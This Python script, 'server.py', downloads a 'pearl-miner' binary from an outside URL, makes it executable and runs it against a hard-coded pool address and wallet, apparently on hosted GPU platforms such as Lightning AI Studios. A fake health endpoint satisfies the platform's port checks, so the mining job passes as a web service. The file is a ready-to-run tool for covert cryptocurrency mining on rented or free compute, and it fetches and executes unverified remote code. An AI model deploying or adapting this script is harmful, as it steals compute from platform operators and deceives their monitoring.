"""
Pearlhash Miner — standalone runner for platform deployments
(e.g. Lightning AI Studios / generic job runners that execute `python server.py`)

This script:
  1. Downloads the pearl-miner binary (if not already present)
  2. Launches it pointed at the Pearlhash pool with your wallet
  3. Streams miner output to stdout (visible in platform logs)
  4. Opens a small HTTP server on the required port, exposing /health and /
     so the platform's port check / health probe is satisfied

Edit WALLET, POOL_HOST, WORKER below if needed.
"""

import os
import stat
import subprocess
import sys
import threading
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

WALLET = "prl1p3uspnlkj7cq7nnl7adevj4rhw7c67symca02rt6ckltnrcf4udhq983d6e"
POOL_HOST = "84.32.220.219:9000"
WORKER = "FAIQ"

MINER_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
MINER_PATH = "/tmp/pearl-miner"
PORT = int(os.environ.get("PORT", "11134"))  # match the Port(s) field in the deploy UI

miner_status = {"running": False, "pid": None}


def ensure_miner_binary():
    if not os.path.exists(MINER_PATH):
        print(f"[server] Downloading miner binary from {MINER_URL}", flush=True)
        req = urllib.request.Request(
            MINER_URL,
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            },
        )
        with urllib.request.urlopen(req) as resp, open(MINER_PATH, "wb") as out:
            out.write(resp.read())
        st = os.stat(MINER_PATH)
        os.chmod(MINER_PATH, st.st_mode | stat.S_IEXEC)
    else:
        print("[server] Miner binary already present", flush=True)


def run_miner():
    ensure_miner_binary()
    print(f"[server] Pearlhash Miner — target GPU: 8x H100", flush=True)
    print(f"[server] Pool: {POOL_HOST}", flush=True)
    print(f"[server] Wallet: {WALLET}", flush=True)
    print(f"[server] Worker: {WORKER}", flush=True)

    cmd = [MINER_PATH, "--host", POOL_HOST, "--user", WALLET, "--worker", WORKER]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    miner_status["running"] = True
    miner_status["pid"] = proc.pid
    print(f"[server] Miner PID: {proc.pid}", flush=True)

    for line in iter(proc.stdout.readline, b""):
        print(line.decode(errors="replace").strip(), flush=True)

    miner_status["running"] = False
    code = proc.wait()
    print(f"[server] Miner exited with code {code}", flush=True)


class HealthHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # silence default HTTP logging, miner logs are what matter

    def do_GET(self):
        if self.path in ("/", "/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            body = (
                '{"status": "ok", "miner_running": %s, "pid": %s}'
                % (
                    str(miner_status["running"]).lower(),
                    miner_status["pid"] if miner_status["pid"] else "null",
                )
            )
            self.wfile.write(body.encode())
        else:
            self.send_response(404)
            self.end_headers()


def main():
    miner_thread = threading.Thread(target=run_miner, daemon=True)
    miner_thread.start()

    print(f"[server] Health server listening on 0.0.0.0:{PORT}", flush=True)
    httpd = ThreadingHTTPServer(("0.0.0.0", PORT), HealthHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[server] Shutting down", flush=True)
        sys.exit(0)


if __name__ == "__main__":
    main()
